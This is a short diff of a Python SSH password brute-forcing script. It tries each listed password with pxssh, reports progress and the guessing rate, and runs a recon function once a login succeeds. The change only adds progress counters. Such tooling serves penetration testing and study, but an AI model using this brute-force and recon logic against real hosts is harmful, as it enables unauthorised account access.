@@ -51,13 +51,13 @@ if __name__ == '__main__':
             ssh.login(hst_arg, usr_arg, pw, port=prt_arg)
         except pxssh.ExceptionPxssh as e:
             if e.args[0] == "password refused":
-                print(f"Password is not '{pw}'")
+                print(f"({i}/{len(pws)}) Password is not '{pw}'")
                 continue
             else:
                 raise
         else:
             clock_end = time.time()
-            print(f"Logged in! Password is '{pw}'")
+            print(f"({i}/{len(pws)}) Logged in! Password is '{pw}'")
             td = clock_end - clock_start
             print(f"Took {td/60:.2f} minutes to check {i}/{len(pws)} passwords at a rate of {td/i:.2f}pw/s.")
             perform_recon(ssh)
